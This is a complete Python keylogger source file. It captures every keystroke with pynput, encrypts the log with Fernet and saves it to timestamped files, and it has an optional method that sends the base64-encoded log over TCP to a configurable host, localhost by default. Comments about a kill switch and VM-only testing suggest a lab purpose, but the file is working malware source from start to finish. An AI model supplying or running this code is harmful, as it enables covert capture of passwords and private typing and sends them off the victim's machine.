
import os
import stat
import time
import base64
import socket
from pathlib import Path
from pynput import keyboard
from cryptography.fernet import Fernet

KEY_FILE = Path("key.txt")  # path to persistent key file

def load_or_create_key(path: Path = KEY_FILE) -> bytes:
    """
    Load a Fernet key from `path` if present. Otherwise generate a new key,
    write it to `path`, and set restrictive permissions where possible.
    Returns the key as bytes.
    """
    if path.exists():
        key_bytes = path.read_bytes().strip()
        # If the file contains a text key, ensure bytes
        if isinstance(key_bytes, str):
            key_bytes = key_bytes.encode()
        return key_bytes

    # Generate new key and save
    key = Fernet.generate_key()
    try:
        # Write key atomically
        tmp = path.with_suffix(".tmpkey")
        tmp.write_bytes(key)
        # Attempt to set file permissions to owner-read/write only (POSIX)
        try:
            tmp.chmod(stat.S_IRUSR | stat.S_IWUSR)
        except Exception:
            # chmod might fail on some platforms (e.g., Windows); ignore safely
            pass
        tmp.replace(path)
        print(f"[*] No key found. Generated new key and saved to {path}.")
        print("[!] IMPORTANT: do NOT commit this file to source control. Add to .gitignore.")
    except Exception as e:
        print(f"[!] Failed to save key to {path}: {e}")
        # fallback: keep key in memory only
        return key
    return key

class KeyLogger:
    def __init__(self, send_on_kill: bool = False, kill_combo=('ctrl', 'shift', 'q'), key_path: Path = KEY_FILE):
        """
        send_on_kill: if True, attempt to send the encrypted log when stopping (use only in VM).
        kill_combo: tuple describing the kill combo; supports 'ctrl', 'shift', and a single char like 'q'.
        key_path: path to a Fernet key file. If present, that key will be used; otherwise one is generated.
        """
        self.log = ""
        # load or create persistent key
        self.key = load_or_create_key(key_path)
        self.cipher = Fernet(self.key)

        # runtime control
        self.stop_flag = False
        self.current_keys = set()   # stores pressed Key / KeyCode objects
        self.listener = None
        self.send_on_kill = send_on_kill

        # normalized kill combo (lowercase strings)
        self.kill_combo = tuple(k.lower() for k in kill_combo)

    # ---------- key event handlers ----------
    def on_press(self, key):
        """
        Called whenever a key is pressed. Tracks keys for combo detection, and appends
        printable representation to self.log.
        """
        # track key for combo detection
        try:
            self.current_keys.add(key)
        except Exception:
            pass

        # capture/log the key pressed (preserves spaces and special key names)
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == keyboard.Key.space:
                current_key = " "
            elif key == keyboard.Key.enter:
                current_key = "\n"
            else:
                current_key = f" {key} "
        self.log += current_key

        # check kill combo after each press
        if self._kill_combo_pressed():
            self._trigger_kill()

    def on_release(self, key):
        """Remove released key from the pressed-keys set."""
        try:
            self.current_keys.discard(key)
        except Exception:
            pass

    # ---------- kill-switch logic ----------
    def _kill_combo_pressed(self) -> bool:
        """
        Detect whether the configured kill combo is currently pressed.
        Supports 'ctrl', 'shift', and one character (e.g., 'q').
        Returns True if the combo is detected.
        """
        wanted = set(self.kill_combo)

        # check ctrl presence if requested
        if 'ctrl' in wanted:
            ctrl_pressed = any(k in self.current_keys for k in (keyboard.Key.ctrl_l, keyboard.Key.ctrl_r, keyboard.Key.ctrl))
            if not ctrl_pressed:
                return False
        else:
            ctrl_pressed = False

        # check shift presence if requested
        if 'shift' in wanted:
            shift_pressed = any(k in self.current_keys for k in (keyboard.Key.shift, keyboard.Key.shift_l, keyboard.Key.shift_r))
            if not shift_pressed:
                return False
        else:
            shift_pressed = False

        # check for single-character key presence (e.g., 'q')
        for k in list(self.current_keys):
            try:
                if isinstance(k, keyboard.KeyCode) and getattr(k, "char", None):
                    if k.char.lower() in wanted:
                        return True
            except Exception:
                continue

        # if combo is only modifiers (ctrl+shift) and both are pressed, treat as pressed
        modifiers_only = all(x in ('ctrl', 'shift') for x in wanted)
        if modifiers_only and ctrl_pressed and shift_pressed:
            return True

        return False

    def _trigger_kill(self):
        """Called when kill combo detected. Stops listener and marks stop flag."""
        print("[*] Kill combo detected. Stopping keylogger...")
        self.stop_flag = True
        if self.listener and self.listener.running:
            try:
                self.listener.stop()
            except Exception:
                pass

    # ---------- encryption / storage / network ----------
    def encrypt_log(self) -> bytes:
        """Encrypt the collected log and return bytes."""
        return self.cipher.encrypt(self.log.encode())

    def save_log(self) -> Path:
        """Save encrypted log to a timestamped .enc file and return the Path."""
        timestamp = time.strftime("%Y%m%d-%H%M%S")
        out_path = Path(f"log-{timestamp}.enc")
        out_path.write_bytes(self.encrypt_log())
        print(f"[*] Saved encrypted log: {out_path}")
        return out_path

    def send_log(self, host="127.0.0.1", port=8080):
        """Base64-encode the encrypted log and send to a simple TCP server (localhost by default)."""
        encrypted_log = self.encrypt_log()
        encoded_log = base64.b64encode(encrypted_log).decode()
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((host, port))
                s.sendall(encoded_log.encode())
            print("[*] Sent encrypted log to server")
        except Exception as e:
            print(f"[!] Failed to send log: {e}")

    # ---------- runtime ----------
    def start(self):
        """
        Start the keyboard listener in non-blocking mode and poll for the stop_flag.
        Use Ctrl+Shift+Q (default) to trigger the hotkey kill-switch.
        """
        self.listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
        self.listener.start()
        print("[*] Keylogger started. Press Ctrl+Shift+Q to stop (hotkey kill-switch).")
        print(f"[*] Using key file: {KEY_FILE.resolve()}")

        try:
            while not self.stop_flag:
                time.sleep(0.1)
        except KeyboardInterrupt:
            # original behavior: Ctrl+C in terminal
            print("[*] KeyboardInterrupt received. Stopping...")
            self.stop_flag = True
            if self.listener and self.listener.running:
                try:
                    self.listener.stop()
                except Exception:
                    pass
        finally:
            # always save logs on exit; optionally send
            saved_path = self.save_log()
            if self.send_on_kill:
                self.send_log()
            # intentionally do not print the key or save it elsewhere automatically

if __name__ == "__main__":
    # Example usage: set send_on_kill=True only when testing in a safe VM.
    logger = KeyLogger(send_on_kill=False, kill_combo=('ctrl', 'shift', 'q'), key_path=KEY_FILE)
    logger.start()
